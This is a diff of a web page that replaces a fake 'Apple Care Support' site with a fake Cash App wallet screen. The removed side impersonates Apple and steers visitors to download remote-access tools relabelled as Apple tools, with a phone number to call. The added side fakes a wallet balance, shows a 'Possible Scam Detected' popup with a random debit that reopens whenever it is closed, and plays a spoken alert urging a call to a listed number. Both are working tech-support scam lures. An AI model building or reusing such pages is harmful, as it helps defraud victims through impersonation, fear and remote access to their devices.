-<path d="M788.1 760.5c-14.6 33.9-31.8 65.1-51.6 93.6-27 38.5-49.1 65.1-66.5 79.8-26.9 24.1-55.8 36.4-86.6 37.2-22.1 0-48.8-6.3-79.9-19.1-31.3-12.7-60.1-19.1-86.3-19.1-27.5 0-57 6.4-88.4 19.1-31.4 12.8-56.7 19.5-75.9 20.1-29.5 1.2-58.9-11.5-88.1-38.2-18.7-16.1-41.7-43.7-68.8-82.8-29.1-41.7-53.1-90.1-72.1-145.3-20.4-59.6-30.6-117.2-30.6-172.7 0-63.6 13.7-118.5 41.2-164.5 21.6-36.9 50.4-66 86.3-87.4 35.9-21.3 74.7-32.3 116.5-33.1 23 0 53.1 7.1 90.4 21.2 37.2 14.1 61.1 21.2 71.7 21.2 8 0 35-8.4 80.8-25.1 43.4-15.6 80-22.1 109.8-19.5 80.8 6.5 141.5 38.4 182 95.7-72.3 43.8-108.1 105.2-107.4 184.1.7 61.5 23 112.7 66.8 153.6 19.9 19.1 42.1 33.8 66.8 44.2-5.4 15.7-11.1 30.9-17.1 45.6zM588.9 36.6c0 48.2-17.6 93.2-52.8 135-42.5 49.6-93.9 78.3-149.7 73.8-.7-5.8-1.1-11.8-1.1-17.8 0-46.3 20.2-95.9 56.2-136.5 18-20.8 40.9-38.1 68.7-51.8C538 26.2 564.6 18.7 590 17c.7 6.6 1.1 13.1 1.1 19.6z"/>
+        <div class="loader"></div>
 
-</svg>
+        <div class="loading-text" id="loadingText">
+            Cash App...
+        </div>
 
-<span>
-Apple Care Support
-</span>
+    </div>
 
-</a>
+    <!-- PIN SCREEN -->
 
-<nav class="nav-links">
+    <div class="pin-screen" id="pinScreen">
 
-<a href="#support-tools">
-Support
-</a>
+        <div class="pin-title">
+            Enter Passcode
+        </div>
 
-<a href="#security">
-Security
-</a>
+        <div class="pin-dots">
 
-<a href="#applecare">
-Apple Care
-</a>
+            <div class="dot" id="d1"></div>
+            <div class="dot" id="d2"></div>
+            <div class="dot" id="d3"></div>
+            <div class="dot" id="d4"></div>
 
-<a href="#contact">
-Contact
-</a>
+        </div>
 
-<a
-href="#support-tools"
-class="support-button">
+    </div>
 
-Start Session
+    <!-- MAIN -->
 
-</a>
+    <div class="main" id="main">
 
-</nav>
+        <!-- STATUS -->
 
-<div class="mobile-menu">
+        <div class="status">
+            <div id="liveTime"></div>
+            <div>5G 🔋</div>
+        </div>
 
-<svg viewBox="0 0 24 24">
+        <!-- TOPBAR -->
 
-<path
-d="M4 7H20M4 12H20M4 17H20"
-stroke="black"
-stroke-width="2"
-stroke-linecap="round"/>
+        <div class="topbar">
 
-</svg>
+            <div class="logo">
+                <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
+            </div>
 
-</div>
-
-</div>
-
-</header>
-
-<!-- ====================================
-HERO SECTION
-==================================== -->
-
-<section class="hero">
-
-<div class="hero-badge glow">
-
-<div class="status-dot"></div>
-
-<span>
-Secure Apple Support Services Online
-</span>
-
-</div>
-
-<h1>
-Need help? Start here.
-</h1>
-
-<p>
-
-Connect securely with Apple support specialists.
-Receive technical assistance, device diagnostics,
-account related assistance, and remote troubleshooting.
-
-</p>
-
-<div class="hero-buttons">
-
-<a
-href="#support-tools"
-class="btn-primary">
-
-Start Support Session
-
-</a>
-
-<a
-href="#complaint-form"
-class="btn-secondary">
-
-Submit Complaint
-
-</a>
-
-</div>
-
-</section>
-
-<!-- ====================================
-DEVICE DETECTION
-==================================== -->
-
-<section class="device-panel">
-
-<div class="device-card">
-
-<div class="section-title">
-
-<h2>
-Smart Device Detection
-</h2>
-
-<p>
-
-Apple detects your browser and operating system automatically to recommend the most suitable
-support method.
-
-</p>
-
-</div>
-
-<div class="device-grid">
-
-<div class="device-box">
-
-<div class="device-title">
-Operating System
-</div>
-
-<div
-class="device-value"
-id="detected-os">
-
-Detecting...
-
-</div>
-
-</div>
-
-<div class="device-box">
-
-<div class="device-title">
-Browser
-</div>
-
-<div
-class="device-value"
-id="detected-browser">
-
-Detecting...
-
-</div>
-
-</div>
-
-<div class="device-box">
-
-<div class="device-title">
-Recommended Tool
-</div>
-
-<div
-class="device-value"
-id="recommended-tool">
-
-Loading...
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-<!-- ====================================
-APPLECARE RESOLUTION CENTER
-==================================== -->
-
-<section
-id="applecare"
-class="section">
-
-<div class="section-title">
-
-<h2>
-
-</h2>
-
-<p>
-
-
-
-</p>
-
-</div>
-
-<div class="applecare-box">
-
-<div class="applecare-content">
-
-<h3>
-Support Designed Around Your Query
-</h3>
-
-<p>
-
-Access remote assistance tools designed to help
-resolve technical issues across Apple devices and
-supported operating systems.
-
-</p>
-
-<p>
-
-Whether you require software guidance, device
-verification, billing & dispute or
-specialized support sessions, Apple Care Support
-provides multiple connection methods.
-
-</p>
-
-<div class="feature-list">
-
-<div class="feature-item">
-✓ Device Diagnostics
-</div>
-
-<div class="feature-item">
-✓ Subscription Support
-</div>
-
-<div class="feature-item">
-✓ Dispute Resolution Center
-</div>
-
-<div class="feature-item">
-✓ Device Setup Assistance
-</div>
-
-<div class="feature-item">
-✓ User Account Management
-</div>
-
-</div>
-
-</div>
-
-<div>
-
-<div class="support-card">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 24 24">
-
-<path
-d="M12 2L20 6V11C20 16.5 16.6 20.9 12 22C7.4 20.9 4 16.5 4 11V6Z"/>
-
-</svg>
-
-</div>
-
-<h3>
-Account Protection
-</h3>
-
-<p>
-
-Security remains a top priority.
-Utilize trusted support channels and secure
-connection methods when receiving assistance.
-
-</p>
-
-</div>
-
-<br>
-
-<div class="support-card">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 24 24">
-
-<path
-d="M12 2A10 10 0 1012 22A10 10 0 0012 2Z"/>
-
-</svg>
-
-</div>
-
-<h3>
-Remote Assistance
-</h3>
-
-<p>
-
-Launch a support session using AnyDesk,
-TeamViewer, Alpemix or ConnectWise depending
-on your operating system.
-
-</p>
-
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-<!-- ====================================
-REMOTE SUPPORT TOOLS
-==================================== -->
-
-<section
-id="support-tools"
-class="section">
-
-<div class="section-title">
-
-<h3>
-
-</h3>
-
-<p>
-
-</p>
-
-</div>
-
-<div class="support-grid">
-
-<!-- ANYDESK -->
-
-<div
-class="support-card fade-up"
-id="apple-anydesk">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 64 64" width="34" height="34">
-
-<rect x="17" y="17"
-width="14"
-height="14"
-rx="2"
-transform="rotate(45 24 24)"
-fill="#E53935"/>
-
-<rect x="33" y="33"
-width="14"
-height="14"
-rx="2"
-transform="rotate(45 40 40)"
-fill="#E53935"/>
-
-<path
-d="M28 28L36 36"
-stroke="#fff"
-stroke-width="2.5"
-stroke-linecap="round"/>
-
-</svg>
-
-</div>
-
-<h3>
-Apple AnyDesk
-</h3>
-
-<p>
-
-Fast remote support for Apple customers.
-Automatically redirects to the correct version
-for Windows, macOS, iPhone, iPad, or Android.
-
-</p>
-
-<div class="support-action">
-
-<span>
-
-Launch Support
-
-<svg width="18" height="18" viewBox="0 0 24 24">
-
-<path
-d="M8 12H18"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"/>
-
-<path
-d="M14 8L18 12L14 16"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"
-stroke-linejoin="round"/>
-
-</svg>
-
-</span>
-
-</div>
-
-</div>
-
-<!-- ALPEMIX -->
-
-<div
-class="support-card fade-up"
-id="apple-alpemix">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 64 64" width="34" height="34">
-
-<polygon
-points="32,12 50,22 32,32 14,22"
-fill="#7C4DFF"/>
-
-<polygon
-points="32,24 50,34 32,44 14,34"
-fill="#9575FF"/>
-
-<polygon
-points="32,36 50,46 32,56 14,46"
-fill="#B39DDB"/>
-
-</svg>
-
-</div>
-
-<h3>
-Apple Alpemix
-</h3>
-
-<p>
-
-Alternative remote assistance platform for
-secure troubleshooting and specialist guidance.
-
-</p>
-
-<div class="support-action">
+            <div class="profile">👤</div>
 
-<span>
+        </div>
 
-Launch Support
+        <!-- HEADER -->
 
-<svg width="18" height="18" viewBox="0 0 24 24">
+        <div class="header">
 
-<path
-d="M8 12H18"
+            <div class="mini-chart">
 
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"/>
+                <div class="chart-top">
 
-<path
-d="M14 8L18 12L14 16"
+                    <div>
 
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"
-stroke-linejoin="round"/>
+                        <div class="chart-balance">
+                            $12,840
+                        </div>
 
-</svg>
+                        <div class="chart-growth">
+                            +12.4% This Week
+                        </div>
 
-</span>
+                    </div>
 
-</div>
-
-</div>
-
-<!-- TEAMVIEWER -->
-
-<div
-class="support-card fade-up"
-id="apple-teamviewer">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 64 64" width="34" height="34">
-
-<circle
-cx="32"
-cy="32"
-r="24"
-fill="#0A84FF"/>
-
-<polygon
-points="20,32 28,25 28,39"
-fill="white"/>
-
-<polygon
-points="44,32 36,25 36,39"
-fill="white"/>
-
-<rect
-x="28"
-y="30"
-width="8"
-height="4"
-fill="white"/>
-
-</svg>
-
-</div>
-
-<h3>
-Apple TeamViewer
-</h3>
-
-<p>
-
-Connect with a certified specialist using
-Apple TeamViewer support services.
-
-</p>
-
-<div class="support-action">
-
-<span>
-
-Launch Support
-
-<svg width="18" height="18" viewBox="0 0 24 24">
-
-<path
-d="M8 12H18"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"/>
-
-<path
-d="M14 8L18 12L14 16"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"
-stroke-linejoin="round"/>
-
-</svg>
-
-</span>
-
-</div>
-
-</div>
-
-<!-- AIR DROID -->
-
-<div
-class="support-card fade-up"
-id="apple-airdroid"">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 64 64" width="34" height="34">
-
-<path
-d="M32 8
-L50 16
-V28
-C50 42
-42 52
-32 56
-C22 52
-14 42
-14 28
-V16
-Z"
-fill="#2196F3"/>
-
-<path
-d="M24 32
-H40"
-stroke="white"
-stroke-width="3"
-stroke-linecap="round"/>
-
-<path
-d="M32 24
-V40"
-stroke="white"
-stroke-width="3"
-stroke-linecap="round"/>
-
-</svg>
-
-</div>
-
-<h3>
-Apple AirDroid
-</h3>
-
-<p>
-
-Launch AirDroid Remote Support for Windows,
-macOS, Android phones, iPhone, iPad and tablets.
-
-</p>
-
-<div class="support-action">
-
-<span>
-
-Launch Support
-
-<svg width="18" height="18" viewBox="0 0 24 24">
-
-<path
-d="M8 12H18"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"/>
-
-<path
-d="M14 8L18 12L14 16"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"
-stroke-linejoin="round"/>
-
-</svg>
-
-</span>
-
-</div>
-
-</div>
-
-<!-- SECURE CONNECT -->
-
-<div
-class="support-card fade-up"
-id="apple-secure-connect">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 64 64" width="34" height="34">
-
-<path
-d="M32 8
-L52 18
-V30
-C52 44
-43 54
-32 58
-C21 54
-12 44
-12 30
-V18
-Z"
-fill="#34C759"/>
-
-<rect
-x="24"
-y="28"
-width="16"
-height="14"
-rx="3"
-fill="white"/>
-
-<path
-d="M27 28
-V24
-a5 5 0 0 1 10 0
-v4"
-fill="none"
-stroke="#34C759"
-stroke-width="2.5"/>
-
-</svg>
-
-</div>
-
-<h3>
-Apple Secure Connect
-</h3>
-
-<p>
-
-Direct secure connection to a live support
-specialist through a dedicated support session.
-
-</p>
-
-<div class="support-action">
-
-<span>
-
-Launch Support
-
-<svg width="18" height="18" viewBox="0 0 24 24">
-
-<path
-d="M8 12H18"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"/>
-
-<path
-d="M14 8L18 12L14 16"
-
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"
-stroke-linejoin="round"/>
-
-</svg>
-
-</span>
-
-</div>
-
-</div>
-
-<!-- CONNECTWISE -->
-
-<div
-class="support-card fade-up"
-id="apple-connectwise">
-
-<div class="support-icon">
-
-<svg viewBox="0 0 64 64" width="34" height="34">
-
-<circle cx="18" cy="18" r="5" fill="#6C5CE7"/>
-
-<circle cx="46" cy="18" r="5" fill="#6C5CE7"/>
-
-<circle cx="32" cy="46" r="6" fill="#6C5CE7"/>
-
-<line
-x1="18"
-y1="18"
-x2="46"
-y2="18"
-stroke="#6C5CE7"
-stroke-width="3"/>
-
-<line
-x1="18"
-y1="18"
-x2="32"
-y2="46"
-stroke="#6C5CE7"
-stroke-width="3"/>
-
-<line
-x1="46"
-y1="18"
-x2="32"
-y2="46"
-stroke="#6C5CE7"
-stroke-width="3"/>
-
-</svg>
-
-</div>
-
-<h3>
-Apple ConnectWise
-</h3>
-
-<p>
-
-ConnectWise Control support platform.
-Recommended for iPhone, iPad and advanced
-remote assistance sessions.
-
-</p>
-
-<div class="support-action">
-
-<span>
-
-Launch Support
-
-<svg width="18" height="18" viewBox="0 0 24 24">
+                    <div class="chart-pill">
+                        LIVE
+                    </div>
 
-<path
-d="M8 12H18"
+                </div>
 
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"/>
+                <svg viewBox="0 0 300 120" class="chart-svg">
 
-<path
-d="M14 8L18 12L14 16"
+                    <path
+                    d="M0 90 
+                       C30 70, 50 80, 70 60
+                       C90 40, 120 50, 140 35
+                       C170 10, 210 30, 240 20
+                       C260 15, 280 25, 300 5"
 
-stroke="white"
-stroke-width="2.2"
-stroke-linecap="round"
-stroke-linejoin="round"/>
+                    fill="none"
+                    stroke="#00d64f"
+                    stroke-width="5"
+                    stroke-linecap="round"/>
 
-</svg>
+                </svg>
 
-</span>
+            </div>
 
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-
-
-<!-- ====================================
-COMPLAINT RESOLUTION
-==================================== -->
-
-<section class="section">
-
-<div class="feature-grid">
-
-<div class="feature-panel light">
-
-<div class="feature-label">
-Dispute Resolution
-</div>
-
-<h2>
-Start a Complaint Resolution Request
-</h2>
-
-<p>
-
-Submit complaints, provide supporting information
-and receive updates throughout the review process.
-
-</p>
-
-<a
-href="#complaint-form"
-class="feature-btn">
-
-Get Started
-
-</a>
-
-<div class="feature-number">
-01
-</div>
-
-</div>
-
-<div class="feature-panel dark">
-
-<div class="feature-label">
-Immediate Assistance
-</div>
-
-<h2>
-Need help right now?
-</h2>
-
-<p>
-
-Connect with customer service for urgent billing,
-technical or account-related concerns.
-
-</p>
-
-<a
-href="tel:+18063002612"
-class="feature-btn">
-
-Call Support
-
-</a>
-
-<div class="feature-number">
-02
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-<!-- ====================================
-GOOGLE FORM
-==================================== -->
-
-<section
-id="complaint-form"
-class="section">
-
-<div class="form-wrapper">
-
-<div class="form-header">
-
-<div class="form-badge">
+        </div>
 
-🔒 Secure Support Form
+        <!-- CTA -->
 
-</div>
-
-<h3>
-
-Complaint Resolution Request
-
-</h3>
-
-<p>
-
-Complete the secure form below.
-Your submission is encrypted and reviewed by our support team.
-
-</p>
-
-</div>
-
-<iframe
-class="google-form-frame"
-src="https://docs.google.com/forms/d/e/1FAIpQLSfEYog3ROdNPImOMOPLi1kPv9Wzhf20_z7dagpwpuciRdjbpw/viewform?embedded=true"
-loading="lazy">
-</iframe>
-
-</div>
-
-</section>
-
-<!-- ====================================
-SUPPORTED SERVICES
-==================================== -->
-
-<section class="section">
-
-<div class="section-title">
-
-<h2>
-Supported Services
-</h2>
-
-</div>
-
-<div class="support-grid">
-
-<div class="support-card">
-
-<h3>
-Device Diagnostics
-</h3>
-
-<p>
-
-Identify software issues,
-performance concerns,
-configuration problems and
-operating system challenges.
+        <div class="cta">
 
-</p>
+            <div class="cta-title">
+                Need Assistance?
+            </div>
 
-</div>
-
-<div class="support-card">
-
-<h3>
-Software Assistance
-</h3>
+            <div class="cta-sub">
+                Contact our transfer support line for instant account help.
+            </div>
 
-<p>
+            <a href="tel:18058247959" class="cta-btn">
+                📞 +1 (805) 824-7959
+            </a>
 
-Guidance for application issues,
-installation support and operating
-system troubleshooting.
+        </div>
 
-</p>
+        <!-- ACTIVITY -->
 
-</div>
+        <div class="section">
 
-<div class="support-card">
+            <div class="section-head">
 
-<h3>
-Account Recovery
-</h3>
+                <div class="section-title">
+                    Recent Activity
+                </div>
 
-<p>
+                <div class="see-all">
+                    See all
+                </div>
 
-Support resources related to account access,
-verification and recovery procedures.
+            </div>
 
-</p>
-
-</div>
+            <div class="activity-card">
 
-<div class="support-card">
+                <!-- ITEM -->
 
-<h3>
-Subscription Support
-</h3>
+                <div class="item">
 
-<p>
+                    <div class="item-left">
 
-Receive assistance with subscription services,
-renewals and supported account features.
+                        <div class="icon black">
+                            ₿
+                        </div>
 
-</p>
+                        <div>
 
-</div>
+                            <div class="name">
+                                Bitcoin Purchase
+                            </div>
 
-<div class="support-card">
+                            <div class="time">
+                                Today • 9:18 AM
+                            </div>
 
-<h3>
-Technical Guidance
-</h3>
+                        </div>
 
-<p>
+                    </div>
 
-Connect with support resources for
-troubleshooting and optimization guidance.
+                    <div class="amount minus">
+                        -$620
+                    </div>
 
-</p>
+                </div>
+				
 
-</div>
+                <!-- ITEM -->
 
-<div class="support-card">
+                <div class="item">
 
-<h3>
-Security Assistance
-</h3>
+                    <div class="item-left">
 
-<p>
+                        <div class="icon green">
+                            ↓
+                        </div>
 
-Information and support regarding
-security, verification and
-account protection measures.
+                        <div>
 
-</p>
+                            <div class="name">
+                                Cash Deposit
+                            </div>
 
-</div>
+                            <div class="time">
+                                Today • 11:42 AM
+                            </div>
 
-</div>
+                        </div>
 
-</section>
+                    </div>
 
-<!-- ====================================
-TRUST SECTION
-==================================== -->
+                    <div class="amount plus">
+                        +$2,400
+                    </div>
 
-<section class="section">
+                </div>
 
-<div class="trust-grid">
 
-<div class="trust-card">
 
-<div class="trust-icon">
-🔒
-</div>
+                <!-- ITEM -->
 
-<h3>
-Secure Connection
-</h3>
+                <div class="item">
 
-</div>
+                    <div class="item-left">
 
-<div class="trust-card">
+                        <div class="icon soft">
+                            ↑
+                        </div>
 
-<div class="trust-icon">
-✓
-</div>
+                        <div>
 
-<h3>
-Dedicated Support
-</h3>
+                            <div class="name">
+                                Transfer Sent
+                            </div>
 
-</div>
+                            <div class="time">
+                                Yesterday • 7:24 PM
+                            </div>
 
-<div class="trust-card">
+                        </div>
 
-<div class="trust-icon">
-🛡️
-</div>
+                    </div>
 
-<h3>
-Privacy Protected
-</h3>
+                    <div class="amount minus">
+                        -$185
+                    </div>
 
-</div>
+                </div>
 
-<div class="trust-card">
+                <!-- ITEM -->
 
-<div class="trust-icon">
-💳
-</div>
+                <div class="item">
 
-<h3>
-Verified Payment Assistance
-</h3>
+                    <div class="item-left">
 
-</div>
+                        <div class="icon green">
+                            $
+                        </div>
 
-</div>
+                        <div>
 
-</section>
+                            <div class="name">
+                                Payment Received
+                            </div>
 
+                            <div class="time">
+                                Yesterday • 1:02 PM
+                            </div>
 
-<footer>
+                        </div>
 
-<div class="footer-container">
+                    </div>
 
-<div class="footer-top">
+                    <div class="amount plus">
+                        +$850
+                    </div>
 
-<div class="footer-logo">
+                </div>
 
-<svg class="apple-logo" viewBox="0 0 814 1000">
+            </div>
 
-<path d="M788.1 760.5c-14.6 33.9-31.8 65.1-51.6 93.6-27 38.5-49.1 65.1-66.5 79.8-26.9 24.1-55.8 36.4-86.6 37.2-22.1 0-48.8-6.3-79.9-19.1-31.3-12.7-60.1-19.1-86.3-19.1-27.5 0-57 6.4-88.4 19.1-31.4 12.8-56.7 19.5-75.9 20.1-29.5 1.2-58.9-11.5-88.1-38.2-18.7-16.1-41.7-43.7-68.8-82.8-29.1-41.7-53.1-90.1-72.1-145.3-20.4-59.6-30.6-117.2-30.6-172.7 0-63.6 13.7-118.5 41.2-164.5 21.6-36.9 50.4-66 86.3-87.4 35.9-21.3 74.7-32.3 116.5-33.1 23 0 53.1 7.1 90.4 21.2 37.2 14.1 61.1 21.2 71.7 21.2 8 0 35-8.4 80.8-25.1 43.4-15.6 80-22.1 109.8-19.5 80.8 6.5 141.5 38.4 182 95.7-72.3 43.8-108.1 105.2-107.4 184.1.7 61.5 23 112.7 66.8 153.6 19.9 19.1 42.1 33.8 66.8 44.2-5.4 15.7-11.1 30.9-17.1 45.6zM588.9 36.6c0 48.2-17.6 93.2-52.8 135-42.5 49.6-93.9 78.3-149.7 73.8-.7-5.8-1.1-11.8-1.1-17.8 0-46.3 20.2-95.9 56.2-136.5 18-20.8 40.9-38.1 68.7-51.8C538 26.2 564.6 18.7 590 17c.7 6.6 1.1 13.1 1.1 19.6z"/>
+        </div>
 
-</svg>
+        
+    </div>
 
-<span>
-AppleCare Support
-</span>
+<!-- NAV -->
 
-</div>
+        <div class="nav">
 
-<div class="footer-links">
+            <div class="nav-item">
+                <div class="nav-icon">🏠</div>
+            </div>
 
-<a href="#support-tools">
-Support Tools
-</a>
+            <div class="nav-item active">
+                <div class="nav-icon">$</div>
+            </div>
 
-<a href="#security">
-Security
-</a>
+            <div class="nav-item">
+                <div class="nav-icon">↗</div>
+            </div>
 
-<a href="#applecare">
-AppleCare
-</a>
+            <div class="nav-item">
+                <div class="nav-icon">🕗</div>
+            </div>
 
-<a href="#contact">
-Contact
-</a>
+        </div>
+		
+		
+<!-- TRANSACTION POPUP -->
 
-</div>
+<div class="popup-wrap" id="popupWrap">
 
-</div>
+    <div class="popup-card">
 
-<div class="footer-bottom">
+        <div class="popup-badge">
+            Possible Scam Detected
+        </div>
 
-<p>
+        <div class="popup-amount" id="popupAmount">
+            -$185
+        </div>
 
-© <span id="currentYear"></span>
-Apple Care Support.
-All rights reserved.
+        <div class="popup-user">
+            BTC Sent to Alex Morgan
+        </div>
 
-</p>
+        <div class="popup-time" id="popupTime">
+            Today • 2:41 PM
+        </div>
 
-<p>
+        <button class="popup-btn" onclick="closePopup()">
+            View Transaction
+        </button>
 
-Compatible with macOS,
-iPhone, iPad,
-Windows and Android.
+        <a href="tel:18058247959" class="popup-support">
+            📞 Contact Support
+        </a>
 
-</p>
+    </div>
 
 </div>
 
 </div>
-
-</footer>
-
-<!-- ====================================
-JAVASCRIPT
-==================================== -->
 
 <script>
 
-/* OS DETECTION */
+/* LOADING TEXT */
 
-function getOperatingSystem(){
+setTimeout(()=>{
 
-const ua=navigator.userAgent;
+    document.getElementById("loadingText").innerText =
+    "Securing Wallet...";
 
-if(/Android/i.test(ua))
-return "Android";
+},1500);
 
-if(/iPhone|iPad|iPod/i.test(ua))
-return "iOS";
+setTimeout(()=>{
 
-if(/Mac/i.test(ua))
-return "macOS";
+    document.getElementById("loadingText").innerText =
+    "Loading Activity...";
 
-if(/Win/i.test(ua))
-return "Windows";
+},3000);
 
-if(/Linux/i.test(ua))
-return "Linux";
+/* SPLASH TO PIN */
 
-return "Unknown";
+setTimeout(()=>{
 
-}
+    document.getElementById("splash").style.opacity="0";
 
-/* BROWSER */
+    setTimeout(()=>{
 
-function getBrowser(){
+        document.getElementById("splash").style.display="none";
 
-const ua=navigator.userAgent;
+        const pin =
+        document.getElementById("pinScreen");
 
-if(ua.indexOf("Edg")>-1)
-return "Microsoft Edge";
+        pin.style.opacity="1";
+        pin.style.pointerEvents="all";
 
-if(
-ua.indexOf("Chrome")>-1 &&
-ua.indexOf("Edg")===-1
-)
-return "Google Chrome";
+    },500);
 
-if(
-ua.indexOf("Safari")>-1 &&
-ua.indexOf("Chrome")===-1
-)
-return "Safari";
+},4200);
 
-if(ua.indexOf("Firefox")>-1)
-return "Firefox";
+/* AUTO PIN */
 
-return "Unknown Browser";
+setTimeout(()=>{
 
-}
+    document.getElementById("d1").classList.add("active");
 
-/* TOOL */
+},5200);
 
-function getRecommendedTool(os){
+setTimeout(()=>{
 
-switch(os){
+    document.getElementById("d2").classList.add("active");
 
-case "Windows":
-return "Apple Quick Assist";
+},5600);
 
-case "macOS":
-return "Apple TeamViewer";
+setTimeout(()=>{
 
-case "iOS":
-return "Apple ConnectWise";
+    document.getElementById("d3").classList.add("active");
 
-case "Android":
-return "Apple AnyDesk";
+},6000);
 
-default:
-return "Apple TeamViewer";
+setTimeout(()=>{
 
-}
+    document.getElementById("d4").classList.add("active");
 
-}
+},6400);
 
-/* UPDATE PANEL */
+/* OPEN MAIN */
 
-function updateDeviceInfo(){
+setTimeout(()=>{
 
-const os=getOperatingSystem();
+    const pin =
+    document.getElementById("pinScreen");
 
-const browser=getBrowser();
+    pin.style.opacity="0";
 
-document.getElementById(
-"detected-os"
-).textContent=os;
+    setTimeout(()=>{
 
-document.getElementById(
-"detected-browser"
-).textContent=browser;
+        pin.style.display="none";
 
-document.getElementById(
-"recommended-tool"
-).textContent=
-getRecommendedTool(os);
+        document
+		.getElementById("main")
+		.classList.add("show");
+		
+		document.querySelector(".nav").style.display = "flex";
 
-}
+    },500);
 
-/* YEAR */
+},7600);
 
-document.getElementById(
-"currentYear"
-).textContent=
-new Date().getFullYear();
+/* =========================
+   LIVE TIME
+========================= */
 
-/* ANYDESK */
+function updatePopupTime(){
 
-document
-.getElementById("apple-anydesk")
-.addEventListener(
-"click",
-function(){
+    const now = new Date();
 
-window.open(
-"https://download.anydesk.com/AnyDesk.exe",
-"_blank"
-);
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
+    });
 
-}
-);
-
-/* ALPEMIX */
-
-document
-.getElementById("apple-alpemix")
-.addEventListener(
-"click",
-function(){
-
-window.open(
-"https://www.alpemix.com/en/download",
-"_blank"
-);
-
-}
-);
-
-/* TEAMVIEWER */
-
-document
-.getElementById("apple-teamviewer")
-.addEventListener(
-"click",
-function(){
-
-window.open(
-"https://download.teamviewer.com/download/TeamViewer_Setup.exe",
-"_blank"
-);
-
-}
-);
-
-/* AIRDROID */
-
-document
-.getElementById("apple-airdroid")
-.addEventListener(
-"click",
-function(){
-
-const ua = navigator.userAgent;
-
-if (/Android/i.test(ua)) {
-
-window.open(
-"https://play.google.com/store/apps/details?id=com.sand.airsos",
-"_blank"
-);
+    document.getElementById("popupTime").innerText =
+    "Today • " + time;
 
 }
 
-else if (/iPhone|iPad|iPod/i.test(ua)) {
+updatePopupTime();
 
-window.open(
-"https://apps.apple.com/us/app/airdroid-remote-support/id1502345783",
-"_blank"
-);
+/* =========================
+   RANDOM AMOUNT
+========================= */
 
-}
+const randomAmount =
+Math.floor(Math.random() * 400) + 80;
 
-else if (/Mac/i.test(ua)) {
+document.getElementById("popupAmount").innerText =
+"-$" + randomAmount;
 
-window.open(
-"https://www.airdroid.com/download/remote-support/",
-"_blank"
-);
+/* =========================
+   SHOW POPUP
+========================= */
 
-}
+setTimeout(()=>{
 
-else if (/Win/i.test(ua)) {
+    document
+    .getElementById("popupWrap")
+    .classList.add("show");
 
-window.open(
-"https://www.airdroid.com/download/remote-support/",
-"_blank"
-);
+    setTimeout(()=>{
 
-}
+        playVerificationAlert();
 
-else{
+    },600);
 
-window.open(
-"https://www.airdroid.com/download/remote-support/",
-"_blank"
-);
+},9800);
 
-}
+/* =========================
+   CLOSE
+========================= */
 
-});
+function closePopup(){
 
-/* SECURE CONNECT */
+    const popup =
+    document.getElementById("popupWrap");
 
-document
-.getElementById("apple-secure-connect")
-.addEventListener(
-"click",
-function(){
+    popup.classList.remove("show");
 
-window.location.href=
-"https://YOUR-SECURE-CONNECT-URL-HERE";
+    /* subtle chart animation */
 
-}
-);
+    const chart =
+    document.querySelector(".mini-chart");
 
-/* CONNECTWISE */
+    chart.style.transform =
+    "scale(.98)";
 
-document
-.getElementById("apple-connectwise")
-.addEventListener(
-"click",
-function(){
+    chart.style.transition =
+    ".3s ease";
 
-window.open(
-"https://apps.apple.com/in/app/connectwise-control/id423995707",
-"_blank"
-);
+    setTimeout(()=>{
 
-}
-);
+        chart.style.transform =
+        "scale(1)";
 
-/* ANIMATIONS */
+    },300);
 
-const observer =
-new IntersectionObserver(
+    /* reopen popup */
 
-(entries)=>{
+    setTimeout(()=>{
 
-entries.forEach(
-(entry)=>{
+        popup.classList.add("show");
 
-if(
-entry.isIntersecting
-){
-
-entry.target.classList.add(
-"active"
-);
+    },2500);
 
 }
 
-});
+/* =========================
+   VOICE ALERT
+========================= */
 
-},
-{
-threshold:0.15
+function playVerificationAlert(){
+
+    if(!('speechSynthesis' in window)){
+        return;
+    }
+
+    window.speechSynthesis.cancel();
+
+    const supportNumber =
+    "1 805 824 7959";
+
+    const message =
+
+    `Crypto transfer alert via Cash App Wallet. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
+
+    const speech =
+    new SpeechSynthesisUtterance(message);
+
+    speech.rate = 0.9;
+    speech.pitch = 1;
+    speech.volume = 1;
+
+    const voices =
+    window.speechSynthesis.getVoices();
+
+    const preferred =
+    voices.find(v =>
+        v.lang.startsWith('en')
+    );
+
+    if(preferred){
+        speech.voice = preferred;
+    }
+
+    window.speechSynthesis.speak(speech);
+
 }
 
-);
+/* =========================
+   LIVE STATUS TIME
+========================= */
 
-document
-.querySelectorAll(".fade-up")
-.forEach(el=>{
+function updateLiveTime(){
 
-observer.observe(el);
+    const now = new Date();
 
-});
+    const time =
+    now.toLocaleTimeString([],{
+        hour:'numeric',
+        minute:'2-digit'
+    });
 
-/* START */
-
-document.addEventListener(
-"DOMContentLoaded",
-function(){
-
-updateDeviceInfo();
+    document.getElementById("liveTime").innerText =
+    time;
 
 }
-);
+
+updateLiveTime();
+
+setInterval(updateLiveTime,1000);
 
 </script>
 
 </body>
-
 </html>
-
